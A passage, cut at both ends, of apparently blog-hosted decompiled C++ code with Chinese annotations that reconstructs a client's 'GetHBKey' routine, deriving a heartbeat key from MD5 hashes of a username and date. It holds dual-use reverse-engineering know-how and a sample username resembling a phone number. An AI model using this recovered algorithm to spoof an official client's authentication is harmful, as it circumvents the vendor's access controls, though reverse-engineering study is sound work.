<span class="comment">// [esp+CCh] [ebp-2B8h]</span></span><br><span class="line">  <span class="keyword">char</span> *pHbKeyGb; <span class="comment">// [esp+D0h] [ebp-2B4h]</span></span><br><span class="line">  <span class="keyword">void</span> *v57; <span class="comment">// [esp+D4h] [ebp-2B0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v58; <span class="comment">// [esp+D8h] [ebp-2ACh]</span></span><br><span class="line">  <span class="keyword">int</span> md5_4_plus5remainer4; <span class="comment">// [esp+DCh] [ebp-2A8h]</span></span><br><span class="line">  <span class="keyword">void</span> *mix_md5_2; <span class="comment">// [esp+E0h] [ebp-2A4h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *userName; <span class="comment">// [esp+E4h] [ebp-2A0h]</span></span><br><span class="line">  <span class="keyword">char</span> *monthDay; <span class="comment">// [esp+E8h] [ebp-29Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *bUsernameMonthDay; <span class="comment">// [esp+ECh] [ebp-298h]</span></span><br><span class="line">  <span class="keyword">char</span> *username_b_MonthDay; <span class="comment">// [esp+F0h] [ebp-294h]</span></span><br><span class="line">  <span class="keyword">char</span> *username_MonthDay_b; <span class="comment">// [esp+F4h] [ebp-290h]</span></span><br><span class="line">  <span class="keyword">char</span> *monthDay_Username_b; <span class="comment">// [esp+F8h] [ebp-28Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *p_HbKeyGb; <span class="comment">// [esp+FCh] [ebp-288h]</span></span><br><span class="line">  <span class="keyword">char</span> *p_HbKeyGa; <span class="comment">// [esp+100h] [ebp-284h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *username; <span class="comment">// [esp+104h] [ebp-280h]</span></span><br><span class="line">  _DWORD *md5_2; <span class="comment">// [esp+108h] [ebp-27Ch]</span></span><br><span class="line">  _DWORD *md5_3; <span class="comment">// [esp+10Ch] [ebp-278h]</span></span><br><span class="line">  <span class="keyword">int</span> index1; <span class="comment">// [esp+114h] [ebp-270h]</span></span><br><span class="line">  <span class="keyword">int</span> index4; <span class="comment">// [esp+118h] [ebp-26Ch]</span></span><br><span class="line">  <span class="keyword">int</span> temp1; <span class="comment">// [esp+11Ch] [ebp-268h]</span></span><br><span class="line">  <span class="keyword">int</span> temp2; <span class="comment">// [esp+120h] [ebp-264h]</span></span><br><span class="line">  _DWORD *md5_4; <span class="comment">// [esp+124h] [ebp-260h]</span></span><br><span class="line">  <span class="keyword">int</span> md5_1; <span class="comment">// [esp+128h] [ebp-25Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> SizeInBytes; <span class="comment">// [esp+134h] [ebp-250h]</span></span><br><span class="line">  <span class="keyword">char</span> *DstBuf; <span class="comment">// [esp+138h] [ebp-24Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *pThis; <span class="comment">// [esp+13Ch] [ebp-248h]</span></span><br><span class="line">  <span class="keyword">int</span> v81; <span class="comment">// [esp+140h] [ebp-244h]</span></span><br><span class="line">  <span class="keyword">int</span> v82; <span class="comment">// [esp+144h] [ebp-240h]</span></span><br><span class="line">  <span class="keyword">int</span> v83; <span class="comment">// [esp+148h] [ebp-23Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v84; <span class="comment">// [esp+14Ch] [ebp-238h]</span></span><br><span class="line">  <span class="keyword">int</span> v85; <span class="comment">// [esp+150h] [ebp-234h]</span></span><br><span class="line">  <span class="keyword">int</span> v86; <span class="comment">// [esp+154h] [ebp-230h]</span></span><br><span class="line">  <span class="keyword">int</span> v87; <span class="comment">// [esp+158h] [ebp-22Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v88; <span class="comment">// [esp+15Ch] [ebp-228h]</span></span><br><span class="line">  <span class="keyword">char</span> hbKey; <span class="comment">// [esp+160h] [ebp-224h]</span></span><br><span class="line">  <span class="keyword">char</span> v90; <span class="comment">// [esp+161h] [ebp-223h]</span></span><br><span class="line">  <span class="keyword">char</span> hbKeyGa; <span class="comment">// [esp+1E4h] [ebp-1A0h]</span></span><br><span class="line">  <span class="keyword">char</span> mem_64_a; <span class="comment">// [esp+1E5h] [ebp-19Fh]</span></span><br><span class="line">  <span class="keyword">char</span> hbKeyGb; <span class="comment">// [esp+228h] [ebp-15Ch]</span></span><br><span class="line">  <span class="keyword">char</span> mem_64_b; <span class="comment">// [esp+229h] [ebp-15Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v95; <span class="comment">// [esp+22Fh] [ebp-155h]</span></span><br><span class="line">  <span class="keyword">char</span> v96[<span class="number">4</span>]; <span class="comment">// [esp+26Ch] [ebp-118h]</span></span><br><span class="line">  <span class="keyword">char</span> v97[<span class="number">5</span>]; <span class="comment">// [esp+270h] [ebp-114h]</span></span><br><span class="line">  <span class="keyword">int</span> v98; <span class="comment">// [esp+275h] [ebp-10Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v99; <span class="comment">// [esp+279h] [ebp-10Bh]</span></span><br><span class="line">  <span class="keyword">int</span> v100; <span class="comment">// [esp+27Dh] [ebp-107h]</span></span><br><span class="line">  <span class="keyword">int</span> v101; <span class="comment">// [esp+281h] [ebp-103h]</span></span><br><span class="line">  <span class="keyword">int</span> v102; <span class="comment">// [esp+285h] [ebp-FFh]</span></span><br><span class="line">  __int16 v103; <span class="comment">// [esp+289h] [ebp-FBh]</span></span><br><span class="line">  <span class="keyword">char</span> v104; <span class="comment">// [esp+28Bh] [ebp-F9h]</span></span><br><span class="line">  <span class="keyword">char</span> v105[<span class="number">4</span>]; <span class="comment">// [esp+28Ch] [ebp-F8h]</span></span><br><span class="line">  <span class="keyword">char</span> v106[<span class="number">5</span>]; <span class="comment">// [esp+290h] [ebp-F4h]</span></span><br><span class="line">  <span class="keyword">int</span> v107; <span class="comment">// [esp+295h] [ebp-EFh]</span></span><br><span class="line">  <span class="keyword">int</span> v108; <span class="comment">// [esp+299h] [ebp-EBh]</span></span><br><span class="line">  <span class="keyword">int</span> v109; <span class="comment">// [esp+29Dh] [ebp-E7h]</span></span><br><span class="line">  <span class="keyword">int</span> v110; <span class="comment">// [esp+2A1h] [ebp-E3h]</span></span><br><span class="line">  <span class="keyword">int</span> v111; <span class="comment">// [esp+2A5h] [ebp-DFh]</span></span><br><span class="line">  __int16 v112; <span class="comment">// [esp+2A9h] [ebp-DBh]</span></span><br><span class="line">  <span class="keyword">char</span> v113; <span class="comment">// [esp+2ABh] [ebp-D9h]</span></span><br><span class="line">  <span class="keyword">char</span> v114[<span class="number">4</span>]; <span class="comment">// [esp+2ACh] [ebp-D8h]</span></span><br><span class="line">  <span class="keyword">char</span> v115[<span class="number">5</span>]; <span class="comment">// [esp+2B0h] [ebp-D4h]</span></span><br><span class="line">  <span class="keyword">int</span> v116; <span class="comment">// [esp+2B5h] [ebp-CFh]</span></span><br><span class="line">  <span class="keyword">int</span> v117; <span class="comment">// [esp+2B9h] [ebp-CBh]</span></span><br><span class="line">  <span class="keyword">int</span> v118; <span class="comment">// [esp+2BDh] [ebp-C7h]</span></span><br><span class="line">  <span class="keyword">int</span> v119; <span class="comment">// [esp+2C1h] [ebp-C3h]</span></span><br><span class="line">  <span class="keyword">int</span> v120; <span class="comment">// [esp+2C5h] [ebp-BFh]</span></span><br><span class="line">  __int16 v121; <span class="comment">// [esp+2C9h] [ebp-BBh]</span></span><br><span class="line">  <span class="keyword">char</span> v122; <span class="comment">// [esp+2CBh] [ebp-B9h]</span></span><br><span class="line">  <span class="keyword">char</span> v123[<span class="number">4</span>]; <span class="comment">// [esp+2CCh] [ebp-B8h]</span></span><br><span class="line">  <span class="keyword">char</span> v124[<span class="number">5</span>]; <span class="comment">// [esp+2D0h] [ebp-B4h]</span></span><br><span class="line">  <span class="keyword">int</span> v125; <span class="comment">// [esp+2D5h] [ebp-AFh]</span></span><br><span class="line">  <span class="keyword">int</span> v126; <span class="comment">// [esp+2D9h] [ebp-ABh]</span></span><br><span class="line">  <span class="keyword">int</span> v127; <span class="comment">// [esp+2DDh] [ebp-A7h]</span></span><br><span class="line">  <span class="keyword">int</span> v128; <span class="comment">// [esp+2E1h] [ebp-A3h]</span></span><br><span class="line">  <span class="keyword">int</span> v129; <span class="comment">// [esp+2E5h] [ebp-9Fh]</span></span><br><span class="line">  __int16 v130; <span class="comment">// [esp+2E9h] [ebp-9Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v131; <span class="comment">// [esp+2EBh] [ebp-99h]</span></span><br><span class="line">  <span class="keyword">char</span> char_array_29_2[<span class="number">29</span>]; <span class="comment">// [esp+2ECh] [ebp-98h]</span></span><br><span class="line">  __int16 v133; <span class="comment">// [esp+309h] [ebp-7Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v134; <span class="comment">// [esp+30Bh] [ebp-79h]</span></span><br><span class="line">  <span class="keyword">char</span> char_array_29_1[<span class="number">29</span>]; <span class="comment">// [esp+30Ch] [ebp-78h]</span></span><br><span class="line">  __int16 v136; <span class="comment">// [esp+329h] [ebp-5Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v137; <span class="comment">// [esp+32Bh] [ebp-59h]</span></span><br><span class="line">  <span class="keyword">char</span> char_array_29_3[<span class="number">29</span>]; <span class="comment">// [esp+32Ch] [ebp-58h]</span></span><br><span class="line">  __int16 v139; <span class="comment">// [esp+349h] [ebp-3Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v140; <span class="comment">// [esp+34Bh] [ebp-39h]</span></span><br><span class="line">  <span class="keyword">char</span> char_array_29_4[<span class="number">29</span>]; <span class="comment">// [esp+34Ch] [ebp-38h]</span></span><br><span class="line">  __int16 v142; <span class="comment">// [esp+369h] [ebp-1Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v143; <span class="comment">// [esp+36Bh] [ebp-19h]</span></span><br><span class="line">  <span class="keyword">char</span> month_day; <span class="comment">// [esp+36Ch] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v145; <span class="comment">// [esp+36Dh] [ebp-17h]</span></span><br><span class="line">  <span class="keyword">int</span> v146; <span class="comment">// [esp+380h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  pThis = <span class="keyword">this</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v146 = <span class="number">0</span>;</span><br><span class="line">  username = <span class="number">0</span>;</span><br><span class="line">  v40 = sub_421680(<span class="string">"@hbxy"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v40 != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v33 = sub_421630((<span class="keyword">int</span>)&amp;v11, <span class="number">0</span>, v40);</span><br><span class="line">    <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>=(v33);</span><br><span class="line">    <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v11);</span><br><span class="line">  &#125;</span><br><span class="line">  username = (<span class="keyword">const</span> <span class="keyword">char</span> *)get_username(&amp;a3);</span><br><span class="line">  userName = username;</span><br><span class="line">  v25 = username + <span class="number">1</span>;</span><br><span class="line">  userName += <span class="built_in">strlen</span>(userName);</span><br><span class="line">  v24 = ++userName - (username + <span class="number">1</span>);</span><br><span class="line">  lenUsername = userName - (username + <span class="number">1</span>);</span><br><span class="line">  month_day = <span class="number">0</span>;</span><br><span class="line">  v145 = <span class="number">0</span>;</span><br><span class="line">  strftime(&amp;month_day, <span class="number">5u</span>, <span class="string">"%m%d"</span>, (<span class="keyword">const</span> struct tm *)(pThis + <span class="number">8</span>));</span><br><span class="line">  monthDay = &amp;month_day;</span><br><span class="line">  v23 = &amp;v145;</span><br><span class="line">  monthDay += <span class="built_in">strlen</span>(monthDay);</span><br><span class="line">  v21 = ++monthDay - (<span class="keyword">char</span> *)&amp;v145;</span><br><span class="line">  lenMonthDay = monthDay - (<span class="keyword">char</span> *)&amp;v145;</span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(pThis, <span class="string">"&gt;&gt;&gt; GetHBKey: %s &gt;&gt;&gt;"</span>, &amp;month_day);</span><br><span class="line">  v18 = <span class="number">1</span>;</span><br><span class="line">  SizeInBytes = lenMonthDay + lenUsername + <span class="number">2</span>;</span><br><span class="line">  mem_17 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(SizeInBytes);</span><br><span class="line">  DstBuf = mem_17;</span><br><span class="line">  <span class="built_in">memset</span>(mem_17, <span class="number">0</span>, SizeInBytes);</span><br><span class="line">  sprintf_s(DstBuf, SizeInBytes, <span class="string">"%c%s%s"</span>, pThis[<span class="number">4</span>], username, &amp;month_day);<span class="comment">// "b177628979080516"</span></span><br><span class="line">  bUsernameMonthDay = DstBuf;</span><br><span class="line">  v16 = DstBuf + <span class="number">1</span>;</span><br><span class="line">  bUsernameMonthDay += <span class="built_in">strlen</span>(bUsernameMonthDay);</span><br><span class="line">  len_bUsernameMonthDay = ++bUsernameMonthDay - (DstBuf + <span class="number">1</span>);</span><br><span class="line">  md5_bUsernameMonthDay = md5_StrWithLength(DstBuf, bUsernameMonthDay - (DstBuf + <span class="number">1</span>));<span class="comment">// 5e64fdaa6449e2abb9693f2757c11652</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(</span><br><span class="line">    pThis,</span><br><span class="line">    <span class="string">"[HBKEY] mdata1: %s [%s]"</span>,</span><br><span class="line">    DstBuf,</span><br><span class="line">    md5_bUsernameMonthDay);</span><br><span class="line">  <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, SizeInBytes);</span><br><span class="line">  sprintf_s(DstBuf, SizeInBytes, <span class="string">"%s%c%s"</span>, username, pThis[<span class="number">4</span>], &amp;month_day);<span class="comment">// "17762897908b0516"</span></span><br><span class="line">  username_b_MonthDay = DstBuf;</span><br><span class="line">  v14 = DstBuf + <span class="number">1</span>;</span><br><span class="line">  username_b_MonthDay += <span class="built_in">strlen</span>(username_b_MonthDay);</span><br><span class="line">  len_username_b_MonthDay = ++username_b_MonthDay - (DstBuf + <span class="number">1</span>);</span><br><span class="line">  md5_username_b_MonthDay = (_DWORD *)md5_StrWithLength(DstBuf, username_b_MonthDay - (DstBuf + <span class="number">1</span>));<span class="comment">// 16dffe496172e2fb1bdb9b2002bfb5a5</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(</span><br><span class="line">    pThis,</span><br><span class="line">    <span class="string">"[HBKEY] mdata2: %s [%s]"</span>,</span><br><span class="line">    DstBuf,</span><br><span class="line">    md5_username_b_MonthDay);</span><br><span class="line">  <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, SizeInBytes);</span><br><span class="line">  sprintf_s(DstBuf, SizeInBytes, <span class="string">"%s%s%c"</span>, username, &amp;month_day, pThis[<span class="number">4</span>]);<span class="comment">// "177628979080516b"</span></span><br><span class="line">  username_MonthDay_b = DstBuf;</span><br><span class="line">  v12 = DstBuf + <span class="number">1</span>;</span><br><span class="line">  username_MonthDay_b += <span class="built_in">strlen</span>(username_MonthDay_b);</span><br><span class="line">  len_username_MonthDay_b = ++username_MonthDay_b - (DstBuf + <span class="number">1</span>);</span><br><span class="line">  md5_username_MonthDay_b = (_DWORD *)md5_StrWithLength(DstBuf, username_MonthDay_b - (DstBuf + <span class="number">1</span>));<span class="comment">// 6614da7943beed0e7baafc0be7fb624c</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(</span><br><span class="line">    pThis,</span><br><span class="line">    <span class="string">"[HBKEY] mdata3: %s [%s]"</span>,</span><br><span class="line">    DstBuf,</span><br><span class="line">    md5_username_MonthDay_b);</span><br><span class="line">  <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, SizeInBytes);</span><br><span class="line">  sprintf_s(DstBuf, SizeInBytes, <span class="string">"%s%s%c"</span>, &amp;month_day, username, pThis[<span class="number">4</span>]);<span class="comment">// "051617762897908b"</span></span><br><span class="line">  monthDay_Username_b = DstBuf;</span><br><span class="line">  v37 = DstBuf + <span class="number">1</span>;</span><br><span class="line">  monthDay_Username_b += <span class="built_in">strlen</span>(monthDay_Username_b);</span><br><span class="line">  len_monthDay_Username_b = ++monthDay_Username_b - (DstBuf + <span class="number">1</span>);</span><br><span class="line">  md5_monthDay_Username_b = (_DWORD *)md5_StrWithLength(DstBuf, monthDay_Username_b - (DstBuf + <span class="number">1</span>));<span class="comment">// 2b28feebb48c0cb98b9f3da404fff646</span></span><br><span class="line">  (*(<span class="keyword">void</span> (**)(<span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *, ...))(*(_DWORD *)pThis + <span class="number">4</span>))(</span><br><span class="line">    pThis,</span><br><span class="line">    <span class="string">"[HBKEY] mdata4: %s [%s]"</span>,</span><br><span class="line">    DstBuf,</span><br><span class="line">    md5_monthDay_Username_b);</span><br><span class="line">  md5_1 = <span class="number">0</span>;</span><br><span class="line">  md5_2 = <span class="number">0</span>;</span><br><span class="line">  md5_3 = <span class="number">0</span>;</span><br><span class="line">  md5_4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">char</span> *)(md5_bUsernameMonthDay + <span class="number">1</span>) % <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    md5_1 = md5_bUsernameMonthDay;</span><br><span class="line">    md5_2 = md5_username_MonthDay_b;</span><br><span class="line">    md5_3 = md5_username_b_MonthDay;</span><br><span class="line">    md5_4 = md5_monthDay_Username_b;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    md5_1 = md5_bUsernameMonthDay;</span><br><span class="line">    md5_2 = md5_monthDay_Username_b;</span><br><span class="line">    md5_3 = md5_username_b_MonthDay;</span><br><span class="line">    md5_4 = md5_username_MonthDay_b;</span><br><span class="line">  &#125;</span><br><span class="line">  hbKeyGa = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;mem_64_a, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  md5_1_pLus3remainder4 = *(<span class="keyword">char</span> *)(md5_1 + <span class="number">3</span>) % <span class="number">4</span>;</span><br><span class="line">  <span class="comment">// 以下一连串的赋值是使 char_array_29_1 = md5_1, char_array_29_2 = md5_2</span></span><br><span class="line">  char_array_29_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line">  v136 = <span class="number">0</span>;</span><br><span class="line">  v137 = <span class="number">0</span>;</span><br><span class="line">  char_array_29_2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">21</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">25</span>] = <span class="number">0</span>;</span><br><span class="line">  v133 = <span class="number">0</span>;</span><br><span class="line">  v134 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)char_array_29_1 = *(_DWORD *)md5_1;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">4</span>] = *(_DWORD *)(md5_1 + <span class="number">4</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span>] = *(_DWORD *)(md5_1 + <span class="number">8</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">12</span>] = *(_DWORD *)(md5_1 + <span class="number">12</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">16</span>] = *(_DWORD *)(md5_1 + <span class="number">16</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">20</span>] = *(_DWORD *)(md5_1 + <span class="number">20</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">24</span>] = *(_DWORD *)(md5_1 + <span class="number">24</span>);</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_1[<span class="number">28</span>] = *(_DWORD *)(md5_1 + <span class="number">28</span>);</span><br><span class="line">  *(_DWORD *)char_array_29_2 = *md5_2;</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">4</span>] = md5_2[<span class="number">1</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span>] = md5_2[<span class="number">2</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">12</span>] = md5_2[<span class="number">3</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">16</span>] = md5_2[<span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">20</span>] = md5_2[<span class="number">5</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">24</span>] = md5_2[<span class="number">6</span>];</span><br><span class="line">  *(_DWORD *)&amp;char_array_29_2[<span class="number">28</span>] = md5_2[<span class="number">7</span>];</span><br><span class="line">  v81 = md5_1_pLus3remainder4;                  <span class="comment">// 0</span></span><br><span class="line">  v82 = <span class="built_in">abs</span>(md5_1_pLus3remainder4 - <span class="number">5</span>) % <span class="number">4</span>;     <span class="comment">// 1</span></span><br><span class="line">  v8 = (md5_1_pLus3remainder4 + <span class="number">2</span>) % <span class="number">4</span>;         <span class="comment">// 2</span></span><br><span class="line">  v83 = (md5_1_pLus3remainder4 + <span class="number">2</span>) % <span class="number">4</span>;        <span class="comment">// 2</span></span><br><span class="line">  v84 = <span class="built_in">abs</span>(md5_1_pLus3remainder4 - <span class="number">3</span>);         <span class="comment">// 3</span></span><br><span class="line">  v96[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v96[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v97[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v98 = <span class="number">0</span>;</span><br><span class="line">  v99 = <span class="number">0</span>;</span><br><span class="line">  v100 = <span class="number">0</span>;</span><br><span class="line">  v101 = <span class="number">0</span>;</span><br><span class="line">  v102 = <span class="number">0</span>;</span><br><span class="line">  v103 = <span class="number">0</span>;</span><br><span class="line">  v104 = <span class="number">0</span>;</span><br><span class="line">  v105[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v105[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)&amp;v106[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v107 = <span class="number">0</span>;</span><br><span class="line">  v108 = <span class="number">0</span>;</span><br><span class="line">  v109 = <span class="number">0</span>;</span><br><span class="line">  v110 = <span class="number">0</span>;</span><br><span class="line">  v111 = <span class="number">0</span>;</span><br><span class="line">  v112 = <span class="number">0</span>;</span><br><span class="line">  v113 = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)v96 = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * md5_1_pLus3remainder4];</span><br><span class="line">  *(_DWORD *)v97 = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * md5_1_pLus3remainder4 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;v97[<span class="number">4</span>] = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v82];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v98 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v82 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v99 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v8];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v100 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v8 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v101 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v84];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v102 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v84 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)v105 = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * md5_1_pLus3remainder4];</span><br><span class="line">  *(_DWORD *)v106 = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * md5_1_pLus3remainder4 + <span class="number">4</span>];</span><br><span class="line">  *(_DWORD *)&amp;v106[<span class="number">4</span>] = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v82];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v107 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v82 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v108 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v8];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v109 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_2[<span class="number">8</span> * v8 + <span class="number">4</span>];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v110 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v84];</span><br><span class="line">  *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)&amp;v111 + <span class="number">3</span>) = *(_DWORD *)&amp;char_array_29_1[<span class="number">8</span> * v84 + <span class="number">4</span>];</span><br><span class="line">  mix_md5_1 = (<span class="keyword">void</span> *)md5_StrWithLength(v96, <span class="number">32</span>);<span class="comment">// 第一个参数  5e64fdaa43beed0eb9693f27e7fb624c6614da796449e2ab7baafc0b57c11652  </span></span><br><span class="line">                                                <span class="comment">// 返回值  5008ef506febfc228802dd43b99c1869</span></span><br><span class="line">                                                <span class="comment">// 为 5e64fdaa43beed0eb9693f27e7fb624c 的 md5</span></span><br><span class="line">  mix_md5_2 = (<span class="keyword">void</span> *)md5_StrWithLength(v105, <span class="number">32</span>);<span class="comment">// 第一个参数  6614da796449e2ab7baafc0b57c11652</span></span><br><span class="line">                                                <span class="comment">// 返回值  46e4a9da513469a20da82e3136f46951</span></span><br><span class="line">  sprintf_s(&amp;hbKeyGa, <span class="number">0x41</span>u, <span class="string">"%s%s"</span>, mix_md5_1, mix_md5_2);<span class="comment">// hbKeyGa = "5008ef506febfc228802dd43b99c186946e4a9da513469a20da82e3136f46951"</span></span><br><span class="line">  lp_mix_md5_1 = mix_md5_1;</span><br><span class="line">  j_j___free_base(mix_md5_1);</span><br><span class="line">  <span class="keyword">if</span> ( lp_mix_md5_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    mix_md5_1 = (<span class="keyword">void</span> *)<span class="number">33059</span>;</span><br><span class="line">    v35 = <span class="number">33059</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v35 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v44 = mix_md5_2;</span><br><span class="line">  j_j___free_base(mix_md5_2);</span><br><span class="line">  <span class="keyword">if</span> ( v44 )</span><br><span class="line">  &#123;</span><br><span class="line">    